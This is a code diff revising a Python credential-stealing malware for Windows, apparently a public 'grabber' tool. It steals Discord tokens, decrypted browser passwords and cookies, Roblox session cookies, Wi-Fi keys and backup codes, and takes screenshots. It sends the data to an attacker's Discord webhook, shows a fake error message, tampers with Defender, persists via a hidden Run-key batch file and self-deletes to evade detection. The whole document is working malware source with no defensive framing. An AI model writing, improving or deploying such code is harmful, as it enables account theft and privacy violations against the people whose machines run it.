@@ -101,21 +101,7 @@ def main(webhook: str):
         Discord()
         
     if __CONFIG__["self_destruct"]:
-        self_destruct()
-
-def trygrab(func):
-    def wrapper(*args, **kwargs):
-        try:
-            func(*args, **kwargs)
-        except Exception:
-            pass
-    return wrapper
-
-
-def checkforwebhook():
-    if __CONFIG__["webhook"] == "None" or not __CONFIG__["webhook"]:
-        print("No webhook in config found. Please rebuild file.")
-        sys.exit()
+        SelfDestruct()
 
 
 def configcheck(list):
@@ -137,10 +123,6 @@ def configcheck(list):
 
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
-
-
-def self_destruct():
-    os.remove(__file__)
 
 
 def disable_defender():
@@ -216,8 +198,8 @@ class PcInfo:
     def get_inf(self, webhook):
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
-        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
-        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000))
+        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
@@ -337,7 +319,7 @@ class Discord:
                                     if uid not in self.ids:
                                         self.tokens.append(token)
                                         self.ids.append(uid)
-
+            else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
@@ -372,7 +354,9 @@ class Discord:
 
     def robloxinfo(self, webhook):
         if __CONFIG__["roblox"]:
-            try:
+            with open(os.path.join(temp_path, "Roblox", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
+
+                robo_cookie = f.read().strip()
                 if robo_cookie == "No Roblox Cookies Found":
                     pass
                 else:
@@ -412,8 +396,7 @@ class Discord:
                         "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
                     }
                     requests.post(webhook, json=data)
-            except Exception:
-                pass
+
 
     def upload(self, webhook):
         for token in self.tokens:
@@ -506,69 +489,54 @@ class Discord:
             requests.post(webhook, json=data)
             self.tokens_sent += token
 
+        self.robloxinfo(webhook)
+
         image = ImageGrab.grab(
             bbox=None,
             all_screens=True,
             include_layered_windows=False,
             xdisplay=None
         )
-        image.save(temp_path + "\\image.png")
-        file = temp_path + "\\image.png"
-        data1 = {
-            "embeds": [
-                {
-                    "title": "Desktop Screenshot",
-                    "color": 2840158,
-                    "image": {
-                        "url": "attachment://image.png"
-                    }
-                }
-            ],
-            "username": "Pyke",
-            "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
-            "attachments": [file]
-        }
-        self.robloxinfo(webhook)
-        requests.post(webhook, json=data1)
+        image.save(temp_path + "\\desktopshot.png")
+        image.close()
 
 
 class Startup:
     def __init__(self) -> None:        
         self.working_dir = os.getenv("APPDATA") + "\\Windows-BSG"
-    
+
         if self.check_self():
             return
 
         self.mkdir()
         self.write_stub()
         self.regedit()
-    
+
     def check_self(self) -> bool:
         if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
             return True
 
         return False
-    
+
     def mkdir(self) -> str:
         if not os.path.isdir(self.working_dir):
             os.mkdir(self.working_dir)
-        
+
         else:
             shutil.rmtree(self.working_dir)
             os.mkdir(self.working_dir)
-    
+
     def write_stub(self) -> None:
         shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
-        
+
         with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
             f.write(f'@echo off\nif not DEFINED IS_HIDDEN set IS_HIDDEN=1 && powershell "start "%~dpnx0" -WindowStyle Hidden %*" && exit\ncall {self.working_dir}\\dat.txt')
-    
+
     def regedit(self) -> None:
         subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/f"], shell=True)
         subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
 
 
-@trygrab
 class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
@@ -628,13 +596,16 @@ class Browsers:
         self.roblox_cookies()
 
     def get_master_key(self, path: str) -> str:
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+        except:
+            pass
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -717,26 +688,22 @@ class Browsers:
         conn.close()
 
     def roblox_cookies(self):
-        global robo_cookie
 
         if not __CONFIG__["roblox"]:
             pass
         else:
             robo_cookie = ""
-            with open(os.path.join(temp_path, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
-                with open(os.path.join(temp_path, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
+            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
+                with open(os.path.join(temp_path, "Roblox", "roblox cookies.txt"), 'w', encoding="utf-8") as f:
                     try:
-                        for line in f2:
+                        for line in g:
                             if ".ROBLOSECURITY" in line:
                                 robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                                 f.write(robo_cookie + "\n")
                     except Exception:
                         robo_cookie = "No Roblox Cookies Found"
-                f2.close()
-            f.close()
 
 
-@trygrab
 class Wifi:
     def __init__(self):
         self.wifi_list = []
@@ -753,7 +720,7 @@ class Wifi:
                     f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
 
-        self.name_pass[i] = ""
+
         for i in self.wifi_list:
             command = subprocess.getoutput(
                 f'netsh wlan show profile "{i}" key=clear')
@@ -772,7 +739,6 @@ class Wifi:
         f.close()
 
 
-@trygrab
 class Minecraft:
     def __init__(self):
         self.roaming = os.getenv("appdata")
@@ -805,7 +771,6 @@ class Minecraft:
         f.close()
 
 
-@trygrab
 class BackupCodes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
@@ -848,6 +813,25 @@ class AntiSpam:
             with open(f"{temp}\\dd_setup.txt", "w") as g:
                 g.write(str(current_time))
             return False
+
+
+class SelfDestruct():
+    def __init__(self):
+        self.path, self.frozen = self.getfile()
+        self.delete()
+
+    def getfile(self):
+        if hasattr(sys, 'frozen'):
+            return (sys.executable, True)
+        else:
+            return (__file__, False)
+
+    def delete(self):
+        if self.frozen:
+            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            os._exit(0)
+        else:
+            os.remove(self.path)
 
 
 class Injection:
